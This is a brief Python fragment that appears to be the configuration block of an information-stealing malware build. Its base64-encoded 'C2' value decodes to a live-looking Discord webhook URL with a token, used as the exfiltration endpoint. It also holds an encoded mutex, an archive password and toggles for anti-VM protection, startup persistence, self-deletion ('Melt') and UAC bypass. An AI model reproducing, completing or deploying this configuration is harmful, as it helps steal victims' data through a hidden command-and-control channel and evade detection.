...
class Settings:
    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTE0NzQ1MjI0NDkxNzIzMTYzNi8zQ1prSVg0T3daRGpMZDhTM1VreXB4enAxa0JGSTZCVkZuZnF2T081cW45VTNtVDBvVG5QeHpPZGJfZlRaVnp4cTJ4Sg==').decode())
    Mutex = base64.b64decode('NFZXdW04eDdUQ01ENTBybQ==').decode()
    PingMe = bool('')
    Vmprotect = bool('true')
    Startup = bool('')
    Melt = bool('')
    UacBypass = bool('')
    ArchivePassword = base64.b64decode('QXJj').decode()
